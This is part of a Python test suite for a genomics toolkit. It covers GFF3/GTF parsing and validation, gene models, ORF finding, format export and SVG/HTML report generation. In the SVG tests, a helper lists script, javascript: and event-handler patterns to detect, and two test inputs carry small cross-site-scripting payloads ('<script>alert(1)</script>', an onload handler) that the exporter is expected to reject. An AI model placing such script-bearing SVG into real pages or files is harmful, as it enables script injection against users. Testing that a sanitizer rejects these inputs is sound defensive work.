        ("chr1\ts\tgene\t1\t5\t.\t+\t.\tnoequals", "INVALID_ATTRIBUTES"),
        ("chr1\ts\tgene\t1\t5\t.\t+", "COLUMN_COUNT"),
        ("chr1\ts\texon\t1\t5\t.\t+\t.\tParent=nope", "UNDEFINED_PARENT"),
    ],
)
def test_validate_flags_each_gff3_syntax_error(line: str, code: str) -> None:
    result = result_of(annotation.validate("##gff-version 3\n" + line + "\n", options={"format": "gff3"}))
    assert result["valid"] is False
    assert code in {item["code"] for item in result["errors"]}
    assert result["errors"][0]["line"] == 2


def test_validate_accepts_good_files_and_checks_gtf_and_duplicates() -> None:
    good = result_of(annotation.validate(GFF3))
    assert good["valid"] is True and good["feature_count"] == 11 and good["errors"] == []
    assert result_of(annotation.validate(GTF))["valid"] is True
    no_version = result_of(annotation.validate("chr1\ts\tgene\t1\t5\t.\t+\t.\tID=a\n", options={"format": "gff3"}))
    assert no_version["valid"] is True and no_version["warnings"][0]["code"] == "MISSING_VERSION"
    duplicate = result_of(annotation.validate("##gff-version 3\nc\ts\tgene\t1\t5\t.\t+\t.\tID=a\nc\ts\tgene\t6\t9\t.\t+\t.\tID=a\n"))
    assert [item["code"] for item in duplicate["errors"]] == ["DUPLICATE_ID"]
    missing = result_of(annotation.validate('c\ts\texon\t1\t5\t.\t+\t.\tgene_id "G";\n', options={"format": "gtf"}))
    assert [item["code"] for item in missing["errors"]] == ["MISSING_TRANSCRIPT_ID"]


def test_build_gene_model_derives_introns_and_utrs() -> None:
    result = result_of(annotation.build_gene_model(GFF3))
    assert result["gene_count"] == 2 and result["transcript_count"] == 2
    gene = result["genes"][0]
    assert (gene["gene_id"], gene["name"], gene["start"], gene["end"], gene["strand"]) == ("g1", "GENE1", 1000, 5000, "+")
    transcript = gene["transcripts"][0]
    assert transcript["exons"] == [[1000, 1200], [2000, 2300], [4000, 5000]]
    assert transcript["introns"] == [[1201, 1999], [2301, 3999]]
    assert transcript["cds"] == [[1101, 1200], [2000, 2300], [4000, 4099]]
    assert transcript["five_prime_utr"] == [[1000, 1100]] and transcript["three_prime_utr"] == [[4100, 5000]]
    assert transcript["utr_derived"] is True
    assert transcript["spliced_length"] == 201 + 301 + 1001 and transcript["cds_length"] == 501 and transcript["protein_length_aa"] == 167
    mirna = result["genes"][1]
    assert mirna["biotype"] == "mirna" and mirna["transcripts"][0]["cds_length"] == 0 and mirna["transcripts"][0]["protein_length_aa"] is None


def test_build_gene_model_from_gtf_treats_the_stop_codon_as_part_of_the_cds_span() -> None:
    transcript = result_of(annotation.build_gene_model(GTF))["genes"][0]["transcripts"][0]
    assert transcript["transcript_id"] == "T1" and transcript["exons"] == [[100, 200], [400, 900]]
    assert transcript["introns"] == [[201, 399]]
    assert transcript["five_prime_utr"] == [[100, 149]] and transcript["three_prime_utr"] == [[604, 900]]
    assert transcript["cds_length"] == 51 + 201 and transcript["protein_length_aa"] == 84


def test_minus_strand_models_swap_utrs_and_number_introns_from_the_five_prime_end() -> None:
    transcript = result_of(annotation.build_gene_model(MINUS))["genes"][0]["transcripts"][0]
    assert transcript["introns"] == [[201, 299], [401, 499]]
    assert transcript["five_prime_utr"] == [[551, 600]] and transcript["three_prime_utr"] == [[100, 149]]
    introns = result_of(annotation.extract(MINUS, options={"entity": "intron"}))["features"]
    assert [(f["start"], f["end"], f["attributes"]["intron_number"]) for f in introns] == [(401, 499, 1), (201, 299, 2)] or [
        (f["start"], f["end"], f["attributes"]["intron_number"]) for f in introns
    ] == [(201, 299, 2), (401, 499, 1)]
    assert all(f["derived"] and f["type"] == "intron" and f["attributes"]["Parent"] == "t3" for f in introns)


def test_extract_entities_from_annotation() -> None:
    def spans(entity: str, **extra: object) -> list[tuple[int, int]]:
        features = result_of(annotation.extract(GFF3, options={"entity": entity, **extra}))["features"]
        return [(f["start"], f["end"]) for f in features]

    assert spans("gene") == [(1000, 5000), (7000, 7100)]
    assert spans("mrna") == [(1000, 5000)]
    assert spans("transcript") == [(1000, 5000), (7000, 7100)]
    assert spans("exon") == [(1000, 1200), (2000, 2300), (4000, 5000), (7000, 7100)]
    assert spans("cds") == [(1101, 1200), (2000, 2300), (4000, 4099)]
    assert spans("intron") == [(1201, 1999), (2301, 3999)]
    assert spans("utr") == [(1000, 1100), (4100, 5000)]
    assert spans("five_prime_utr") == [(1000, 1100)] and spans("three_prime_utr") == [(4100, 5000)]
    assert spans("mirna") == [(7000, 7100), (7000, 7100)]  # the miRNA transcript and its miRNA-biotype gene
    assert spans("exon", seqid="chr1", strand="-") == [(7000, 7100)]
    assert spans("exon", start=1500, end=2100) == [(2000, 2300)]
    custom = result_of(annotation.extract("c\ts\ttRNA\t1\t9\t.\t+\t.\tID=a\nc\ts\tgene\t1\t9\t.\t+\t.\tID=b\n", options={"entity": "TRNA", "format": "gff3"}))
    assert [(f["type"], f["start"], f["end"]) for f in custom["features"]] == [("tRNA", 1, 9)]  # any other value: exact type match, case-insensitive
    limited = result_of(annotation.extract(GFF3, options={"entity": "exon", "limit": 2}))
    assert limited["count"] == 2 and limited["truncated"] is True


def test_extract_sequences_from_a_genome() -> None:
    gff = "c\ts\tgene\t3\t6\t.\t+\t.\tID=a\nc\ts\tgene\t9\t12\t.\t-\t.\tID=b\n"
    genome = ">c\nAACGTTGGACCTGG\n"
    features = result_of(annotation.extract(gff, options={"entity": "gene", "format": "gff3", "genome": genome}))["features"]
    # positions 3-6 = CGTT ; positions 9-12 = ACCT, reverse complemented on the minus strand = AGGT
    assert [f["sequence"] for f in features] == ["CGTT", "AGGT"]
    with pytest.raises(InputFormatError):
        annotation.extract(gff, options={"entity": "gene", "format": "gff3", "genome": ">c\nAAA\n"})


def test_extract_orf_scans_both_strands_with_hand_computed_coordinates() -> None:
    sequence = "CCATGAAATTTGGGTAACC"  # ATG AAA TTT GGG TAA at 0-based 2..17
    forward = result_of(annotation.extract(sequence, options={"entity": "orf", "min_length": 9}))
    assert forward["count"] == 1
    orf = forward["features"][0]
    assert (orf["strand"], orf["frame"], orf["start"], orf["end"], orf["length"]) == ("+", 3, 3, 17, 15)
    assert orf["protein"] == "MKFG" and orf["has_stop"] is True
    reverse = result_of(annotation.extract("GGTTACCCAAATTTCATGG", options={"entity": "orf", "min_length": 9}))["features"]
    assert [(o["strand"], o["frame"], o["start"], o["end"], o["protein"]) for o in reverse] == [("-", -3, 3, 17, "MKFG")]
    assert result_of(annotation.extract(sequence, options={"entity": "orf", "min_length": 18}))["count"] == 0
    open_orf = result_of(annotation.extract("ATGAAATTT", options={"entity": "orf", "min_length": 9, "require_stop": False, "both_strands": False}))["features"]
    assert [(o["start"], o["end"], o["has_stop"], o["protein"]) for o in open_orf] == [(1, 9, False, "MKF")]
    fasta = result_of(annotation.extract(">a\nATGTAA\n>b\nATGCCCTGA\n", options={"entity": "orf", "min_length": 6, "both_strands": False}))["features"]
    assert [(o["seqid"], o["start"], o["end"], o["protein"]) for o in fasta] == [("a", 1, 6, "M"), ("b", 1, 9, "MP")]
    with pytest.raises(InputFormatError):
        annotation.extract("ATG#AA", options={"entity": "orf"})
    with pytest.raises(ConfigurationError):
        annotation.extract("ATG", options={"entity": "orf", "start_codons": ["AT"]})


def test_summarize_counts_types_and_structure() -> None:
    result = result_of(annotation.summarize(GFF3))
    assert result["feature_count"] == 11 and result["format"] == "gff3"
    assert result["types"]["exon"] == {"count": 4, "total_bp": 201 + 301 + 1001 + 101, "mean_length": 1604 / 4}
    assert result["types"]["CDS"]["total_bp"] == 501 and result["types"]["gene"]["count"] == 2
    assert result["seqids"] == {"chr1": 11} and result["strands"] == {"+": 8, "-": 3}
    assert (result["gene_count"], result["transcript_count"], result["exon_count"], result["intron_count"]) == (2, 2, 4, 2)
    assert result["coding_transcripts"] == 1 and result["multi_exon_transcripts"] == 1
    assert result["transcripts_per_gene"] == {"mean": 1.0, "max": 1} and result["exons_per_transcript"] == {"mean": 2.0, "max": 3}


def test_check_annotation_consistency_accepts_a_consistent_model_and_reports_each_rule() -> None:
    assert result_of(annotation.check_annotation_consistency(GFF3))["consistent"] is True
    assert result_of(annotation.check_annotation_consistency(GTF))["consistent"] is True
    assert result_of(annotation.check_annotation_consistency(MINUS))["consistent"] is True

    def codes(*lines: str, **options: object) -> set[str]:
        result = result_of(annotation.check_annotation_consistency("##gff-version 3\n" + "\n".join(lines) + "\n", options=options))
        return {item["code"] for item in result["issues"]}

    gene = "c\ts\tgene\t100\t1000\t.\t+\t.\tID=g"
    mrna = "c\ts\tmRNA\t100\t1000\t.\t+\t.\tID=t;Parent=g"
    assert "EXON_OVERLAP" in codes(gene, mrna, "c\ts\texon\t100\t300\t.\t+\t.\tParent=t", "c\ts\texon\t250\t400\t.\t+\t.\tParent=t")
    assert "CHILD_OUTSIDE_PARENT" in codes(gene, mrna, "c\ts\texon\t900\t1100\t.\t+\t.\tParent=t")
    assert "STRAND_MISMATCH" in codes(gene, mrna, "c\ts\texon\t100\t300\t.\t-\t.\tParent=t")
    assert "MISSING_PARENT" in codes(gene, "c\ts\tmRNA\t100\t1000\t.\t+\t.\tID=t;Parent=zzz")
    assert "DUPLICATE_ID" in codes(gene, gene)
    assert "SEQID_MISMATCH" in codes(gene, "d\ts\tmRNA\t100\t1000\t.\t+\t.\tID=t;Parent=g")
    assert "CDS_OUTSIDE_EXON" in codes(gene, mrna, "c\ts\texon\t100\t300\t.\t+\t.\tParent=t", "c\ts\tCDS\t250\t350\t.\t+\t0\tParent=t")
    assert "BEYOND_SEQUENCE_END" in codes(gene, contig_lengths={"c": 500})
    assert "GENE_WITHOUT_TRANSCRIPT" in codes(gene)
    # CDS 100-199 (100 nt) is followed by phase 0 although (3 - 100 % 3) % 3 = 2 is expected; the total of 200 nt is not a codon multiple
    phase = codes(gene, mrna, "c\ts\texon\t100\t199\t.\t+\t.\tParent=t", "c\ts\texon\t300\t399\t.\t+\t.\tParent=t",
                  "c\ts\tCDS\t100\t199\t.\t+\t0\tParent=t", "c\ts\tCDS\t300\t399\t.\t+\t0\tParent=t")
    assert phase == {"CDS_PHASE_MISMATCH", "CDS_LENGTH_NOT_MULTIPLE_OF_3"}
    assert result_of(annotation.check_annotation_consistency("##gff-version 3\n" + "\n".join([gene, mrna]) + "\n"))["consistent"] is True


def test_compare_counts_shared_and_private_features() -> None:
    features = result_of(annotation.parse(GFF3))["features"]
    right = features[1:]  # without the first gene
    result = result_of(annotation.compare(GFF3, options={"other": right}))
    assert (result["left_count"], result["right_count"], result["shared"], result["only_left"], result["only_right"]) == (11, 10, 10, 1, 0)
    assert result["jaccard"] == pytest.approx(10 / 11)
    assert result["only_left_examples"] == [{"seqid": "chr1", "type": "gene", "start": 1000, "end": 5000, "strand": "+"}]
    assert result["by_type"]["gene"] == {"shared": 1, "only_left": 1, "only_right": 0}
    pair = result_of(annotation.compare({"left": GFF3, "right": GFF3}, options={"feature_types": ["exon"]}))
    assert pair["jaccard"] == 1.0 and pair["shared"] == 4
    with pytest.raises(ConfigurationError):
        annotation.compare(GFF3)


def test_export_converts_between_formats() -> None:
    gtf = result_of(annotation.export(GFF3, options={"format": "gtf"}))["text"].splitlines()
    assert gtf[0] == 'chr1\tsrc\tgene\t1000\t5000\t.\t+\t.\tgene_id "g1"; gene_name "GENE1";'
    assert gtf[1] == 'chr1\tsrc\tmRNA\t1000\t5000\t.\t+\t.\tgene_id "g1"; transcript_id "t1";'
    assert gtf[5] == 'chr1\tsrc\tCDS\t1101\t1200\t.\t+\t0\tgene_id "g1"; transcript_id "t1";'
    assert result_of(annotation.export(GFF3, options={"format": "bed", "feature_type": "gene"}))["text"] == "chr1\t999\t5000\tg1\t0\t+\nchr1\t6999\t7100\tg2\t0\t-\n"
    bed12 = result_of(annotation.export(GFF3, options={"format": "bed12"}))["text"].splitlines()
    assert bed12[0] == "chr1\t999\t5000\tt1\t0\t+\t1100\t4099\t0\t3\t201,301,1001,\t0,1000,3000,"
    assert bed12[1] == "chr1\t6999\t7100\tt2\t0\t-\t7100\t7100\t0\t1\t101,\t0,"
    back = result_of(annotation.export(GTF, options={"format": "gff3"}))["text"].splitlines()
    assert back[0] == "##gff-version 3"
    assert back[1] == "chr1\tsrc\tgene\t100\t900\t.\t+\t.\tID=G1;Name=Foo"
    assert back[2] == "chr1\tsrc\ttranscript\t100\t900\t.\t+\t.\tID=T1;Parent=G1;tag=basic,CCDS"
    assert "chr1\tsrc\texon\t100\t200\t.\t+\t.\tID=T1.exon1;Parent=T1;exon_number=1" in back
    synthesized = result_of(annotation.export(GTF.split("\n", 2)[2], options={"format": "gff3", "source_format": "gtf"}))["text"].splitlines()
    assert synthesized[1].split("\t")[2:5] == ["gene", "100", "900"] and synthesized[2].split("\t")[2:5] == ["mRNA", "100", "900"]  # CDS children make it an mRNA
    assert json.loads(result_of(annotation.export(GFF3, options={"format": "json"}))["text"])[0]["attributes"] == {"ID": "g1", "Name": "GENE1"}


def test_export_writes_only_when_asked_and_refuses_to_overwrite(tmp_path: Path) -> None:
    target = tmp_path / "out.gtf"
    result = result_of(annotation.export(GFF3, options={"format": "gtf", "output": str(target)}))
    assert target.read_text(encoding="utf-8") == result["text"] and result["path"] == str(target)
    with pytest.raises(ConfigurationError):
        annotation.export(GFF3, options={"format": "gtf", "output": str(target)})
    annotation.export(GFF3, options={"format": "gtf", "output": str(target), "overwrite": True})
    with pytest.raises(ConfigurationError):
        annotation.export(GFF3, options={"format": "pdf"})


def test_index_builds_lookup_tables() -> None:
    result = result_of(annotation.index(GFF3))
    assert result["feature_count"] == 11
    assert result["by_id"]["g1"] == {"seqid": "chr1", "type": "gene", "start": 1000, "end": 5000, "strand": "+"}
    assert result["children"]["g1"] == ["t1"]
    assert result["children"]["t1"] == ["e1", "e2", "e3", "c1", "c1", "c1"]
    assert result["children"]["t2"] == ["exon@12"]
    assert result["gene_transcripts"] == {"g1": ["t1"], "g2": ["t2"]}
    # sorted by (start, end), ties in file order
    assert result["by_seqid"]["chr1"][:3] == [[1000, 1200, "e1", "exon"], [1000, 5000, "g1", "gene"], [1000, 5000, "t1", "mRNA"]]
    assert result["type_counts"] == {"gene": 2, "mRNA": 1, "exon": 4, "CDS": 3, "miRNA": 1}


def test_annotate_overlaps_and_nearest_features() -> None:
    options = {"annotation": GFF3}
    rows = result_of(annotation.annotate(["chr1:1100-1150", "chr1:5000-5001", "chr1:6000-6001", "chr9:1-2"], options=options))["annotations"]
    first, edge, between, absent = rows
    assert [(g["id"], g["overlap_bp"]) for g in first["overlapping"]] == [("g1", 51)] and first["nearest"] is None
    assert [(g["id"], g["overlap_bp"]) for g in edge["overlapping"]] == [("g1", 1)]
    assert between["overlapping"] == []
    # gene g2 starts at 7000 (999 bp away, minus strand: the region lies beyond its 3' end) ; g1 ends 1000 bp to the left
    assert (between["nearest"]["id"], between["nearest"]["distance"], between["nearest"]["relation"]) == ("g2", 999, "downstream")
    assert absent["overlapping"] == [] and absent["nearest"] is None
    typed = result_of(annotation.annotate({"regions": [{"seqid": "chr1", "start": 1100, "end": 1150, "id": "r"}]}, options={**options, "feature_types": ["exon"]}))["annotations"][0]
    assert typed["region"]["id"] == "r" and [g["id"] for g in typed["overlapping"]] == ["e1"]
    far = result_of(annotation.annotate("chr1:6000", options={**options, "max_distance": 10}))["annotations"][0]
    assert far["nearest"] is None
    left = result_of(annotation.annotate("chr1:5500", options={**options}))["annotations"][0]["nearest"]
    assert (left["id"], left["distance"], left["relation"]) == ("g1", 500, "downstream")
    with pytest.raises(InputFormatError):
        annotation.annotate(["chr1-5"], options=options)
    with pytest.raises(InputFormatError):
        annotation.annotate([{"seqid": "chr1", "start": 5, "end": 1}], options=options)


def test_assign_gene_ontology_and_pathways_use_only_the_supplied_mapping() -> None:
    mapping = {"BRCA1": ["GO:0006281", "GO:0003677"], "TP53": "GO:0006915"}
    result = result_of(annotation.assign_gene_ontology(["BRCA1", "TP53", "XYZ"], options={"mapping": mapping, "term_names": {"GO:0006915": "apoptotic process"}}))
    assert result["assignments"] == {"BRCA1": ["GO:0003677", "GO:0006281"], "TP53": ["GO:0006915"], "XYZ": []}
    assert result["unannotated"] == ["XYZ"] and result["annotated_fraction"] == pytest.approx(2 / 3)
    assert result["terms"]["GO:0006915"] == {"name": "apoptotic process", "genes": ["TP53"]}
    sets = result_of(annotation.assign_gene_ontology("brca1,tp53", options={"gene_sets": {"GO:0006281": ["BRCA1"]}, "case_insensitive": True}))
    assert sets["assignments"] == {"brca1": ["GO:0006281"], "tp53": []}
    pathways = result_of(annotation.assign_pathways({"genes": ["A", "B"]}, options={"gene_sets": {"hsa04110": ["A", "B"], "hsa04210": ["B"]}}))
    assert pathways["assignments"] == {"A": ["hsa04110"], "B": ["hsa04110", "hsa04210"]} and pathways["annotated_fraction"] == 1.0
    with pytest.raises(InputFormatError):
        annotation.assign_gene_ontology(["A"], options={"mapping": {"A": ["not-a-go-term"]}})
    with pytest.raises(InputFormatError):
        annotation.assign_gene_ontology([], options={"mapping": mapping})
    with pytest.raises(ConfigurationError):
        annotation.assign_pathways(["A"], options={"mapping": ["x"]})


# --------------------------------------------------------------------------------------------
# visualization
# --------------------------------------------------------------------------------------------

FASTA = ">a\nACGTACGTAC\n>b\nGGGGCCCCAANN\n>c\nATATATAT\n"


def assert_clean_svg(svg: str) -> ET.Element:
    root = ET.fromstring(svg)
    assert root.tag == "{http://www.w3.org/2000/svg}svg"
    lowered = svg.lower()
    assert "<script" not in lowered and "javascript:" not in lowered and "<foreignobject" not in lowered
    assert not any(name.lower().startswith("on") for element in root.iter() for name in element.attrib)
    return root


def test_plot_length_histogram_reports_the_plotted_counts() -> None:
    result = result_of(visualization.plot(FASTA, options={"bins": 3}))
    assert_clean_svg(result["svg"])
    assert result["kind"] == "length_histogram"
    data = result["data"]  # lengths 10, 12, 8
    assert data["count"] == 3 and data["min"] == 8 and data["max"] == 12 and data["mean"] == 10
    assert data["bin_edges"] == pytest.approx([8, 8 + 4 / 3, 8 + 8 / 3, 12])
    assert data["counts"] == [1, 1, 1]
    assert result["sha256"] == hashlib.sha256(result["svg"].encode()).hexdigest()
    one = result_of(visualization.plot({"records": ["ATGC"]}))
    assert one["data"]["counts"] == [1]


def test_plot_gc_distribution_uses_fixed_percent_bins() -> None:
    result = result_of(visualization.plot(FASTA, options={"kind": "gc_distribution", "bins": 4}))
    assert_clean_svg(result["svg"])
    data = result["data"]
    # GC / (A+C+G+T): ACGTACGTAC = 5/10, GGGGCCCCAANN = 8/10, ATATATAT = 0/8
    assert data["gc_percent"] == [50.0, 80.0, 0.0]
    assert data["bin_edges"] == [0.0, 25.0, 50.0, 75.0, 100.0] and data["counts"] == [1, 0, 1, 1]
    skipped = result_of(visualization.plot("NNNN\nACGT", options={"kind": "gc_distribution"}))
    assert skipped["data"]["count"] == 1
    with pytest.raises(InputFormatError):
        visualization.plot("NNNN", options={"kind": "gc_distribution"})


def test_plot_base_composition_counts_every_symbol() -> None:
    result = result_of(visualization.plot(FASTA, options={"kind": "base_composition"}))
    assert_clean_svg(result["svg"])
    # A: 3 + 2 + 4, C: 3 + 4, G: 2 + 4, T: 2 + 0 + 4 ; N: 2   (30 symbols)
    assert result["data"]["counts"] == {"A": 9, "C": 7, "G": 6, "T": 6, "N": 2}
    assert result["data"]["total_bases"] == 30
    assert result["data"]["proportions"]["A"] == pytest.approx(0.3)


def test_plot_sequence_maps_and_label_comparison() -> None:
    sequence = result_of(visualization.plot(FASTA, options={"kind": "sequence", "id": "b"}))
    assert_clean_svg(sequence["svg"])
    assert sequence["data"] == {"id": "b", "length": 12}
    linear = result_of(visualization.plot("ACGTACGTACGTACGTACGT", options={"kind": "linear_map", "features": [{"type": "gene", "start": 2, "end": 9}]}))
    assert_clean_svg(linear["svg"])
    assert linear["data"]["feature_count"] == 1 and 'class="feature"' in linear["svg"]
    circular = result_of(visualization.plot("ACGTACGTACGTACGTACGT", options={"kind": "circular_map"}))
    assert_clean_svg(circular["svg"])
    comparison = result_of(visualization.plot({"true": ["a", "b", "a"], "predicted": ["a", "a", "a"]}, options={"kind": "label_comparison"}))
    assert_clean_svg(comparison["svg"])
    assert comparison["data"]["true_counts"] == {"a": 2, "b": 1} and comparison["data"]["predicted_counts"] == {"a": 3, "b": 0}


def test_plot_writes_a_file_only_on_request(tmp_path: Path) -> None:
    target = tmp_path / "hist.svg"
    result = result_of(visualization.plot(FASTA, options={"output": str(target)}))
    assert target.read_text(encoding="utf-8") == result["svg"] and result["path"] == str(target)
    with pytest.raises(ConfigurationError):
        visualization.plot(FASTA, options={"output": str(target)})
    assert result_of(visualization.plot(FASTA, options={"output": str(target), "overwrite": True}))["path"] == str(target)
    assert result_of(visualization.plot(FASTA))["path"] is None


def test_plot_invalid_inputs() -> None:
    with pytest.raises(ConfigurationError):
        visualization.plot(FASTA, options={"kind": "pie_chart"})
    with pytest.raises(InputFormatError):
        visualization.plot("AC#GT")
    with pytest.raises(InputFormatError):
        visualization.plot([])
    with pytest.raises(InputFormatError):
        visualization.plot({"x": 1}, options={"kind": "label_comparison"})
    with pytest.raises(InputFormatError):
        visualization.plot(FASTA, options={"kind": "sequence", "id": "zzz"})


def test_generate_analysis_summary_statistics() -> None:
    result = result_of(visualization.generate_analysis_summary(FASTA))
    assert result["sequence_count"] == 3 and result["total_bases"] == 30
    assert result["length"] == {"min": 8, "max": 12, "mean": 10.0, "median": 10.0, "n50": 10}
    assert result["gc_percent"] == pytest.approx(100 * 13 / 28)  # G+C = 13 of 28 unambiguous bases
    assert result["non_acgt_bases"] == 2 and result["n_fraction"] == pytest.approx(2 / 30)
    assert result["base_counts"] == {"A": 9, "C": 7, "G": 6, "N": 2, "T": 6}
    assert result["per_sequence"][1] == {"id": "b", "length": 12, "gc_percent": 80.0}
    assert "- N50: 10" in result["text"] and "GC content: 46.43 %" in result["text"]


def test_generate_qc_and_genome_html_reports(tmp_path: Path) -> None:
    target = tmp_path / "qc.html"
    result = result_of(visualization.generate_qc_html_report(FASTA, options={"min_length": 9, "output": str(target)}))
    assert result["record_count"] == 3 and set(result["result_names"]) == {"qc", "summary"}
    assert result["qc"]["passed"] == 1
    assert result["qc"]["failed"] == [{"id": "b", "reasons": ["N fraction 0.167 > 0.1"]}, {"id": "c", "reasons": ["length 8 < 9"]}]
    assert target.read_text(encoding="utf-8") == result["html"] and result["html"].startswith("<!doctype html>")
    assert "<table>" in result["html"] and "DNAKit sequence QC report" in result["html"] and "&quot;failed_count&quot;: 2" in result["html"]
    genome = result_of(visualization.generate_html_genome_report(FASTA, options={"annotation": GFF3, "include_html": False}))
    assert genome["record_count"] == 3 and "html" not in genome
    assert genome["annotation"]["gene_count"] == 2 and genome["summary"]["length"]["n50"] == 10
    assert set(genome["result_names"]) == {"annotation", "summary"}


def test_export_figure_writes_svg_and_rejects_unsafe_input(tmp_path: Path) -> None:
    figure = result_of(visualization.plot(FASTA))
    target = tmp_path / "figure.svg"
    exported = result_of(visualization.export_figure(figure, options={"output": str(target)}))
    assert target.read_text(encoding="utf-8") == figure["svg"]
    assert exported["format"] == "svg" and exported["bytes"] == target.stat().st_size
    assert exported["sha256"] == hashlib.sha256(target.read_bytes()).hexdigest()
    plain = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="10"><rect width="5" height="5"/></svg>'
    assert result_of(visualization.export_figure(plain, options={"output": str(tmp_path / "plain.svg")}))["format"] == "svg"
    with pytest.raises(ConfigurationError):
        visualization.export_figure(figure, options={"output": str(target)})  # exists
    for unsafe in (
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><script>alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" onload="x()"/>',
    ):
        with pytest.raises(ConfigurationError):
            visualization.export_figure(unsafe, options={"output": str(tmp_path / "bad.svg")})
    with pytest.raises(InputFormatError):
        visualization.export_figure("<svg", options={"output": str(tmp_path / "bad.svg")})
    with pytest.raises(InputFormatError):
        visualization.export_figure("hello", options={"output": str(tmp_path / "bad.svg")})
    with pytest.raises(ConfigurationError):
        visualization.export_figure(plain)  # no output
    png = visualization.export_figure(plain, options={"output": str(tmp_path / "x.png")})
    if importlib.util.find_spec("cairosvg") is None:
        assert png["status"] == "not_implemented"
    else:
        assert png["status"] == "ok" and (tmp_path / "x.png").read_bytes()[:4] == b"\x89PNG"


# --------------------------------------------------------------------------------------------
# functions that stay honestly not implemented
# --------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("function", "arguments"),
    [
        (security.benchmark, ("wf",)),
        (security.cancel, ("job-1",)),
        (security.clear, ("x",)),
        (security.monitor, ("job-1",)),
        (security.retry, ("job-1",)),
        (security.submit_cloud_job, ({"image": "x"},)),
        (security.submit_hpc_job, ({"script": "run.sh"},)),
        (databases.cache, ("x",)),
        (databases.download, ("x",)),
        (databases.export, ("x",)),
        (databases.fetch, ("x",)),
        (databases.list_versions, ("x",)),
        (annotation.assign_protein_domains, ("MKV",)),
        (annotation.find_homologous_genes, ("BRCA1",)),
        (annotation.assign_gene_ontology, (["BRCA1"],)),  # no mapping supplied
        (annotation.assign_pathways, (["BRCA1"],)),
        (annotation.annotate, (["chr1:1-2"],)),  # no annotation supplied
        (visualization.generate_clinical_pdf_report, ({"variants": []},)),
        (external.run, (["no-such-program-xyz"],)),
    ],
)
def test_leftover_functions_report_not_implemented(function, arguments) -> None:
    envelope = function(*arguments)
    assert envelope["status"] == "not_implemented"
    assert envelope["message"] and "result" not in envelope
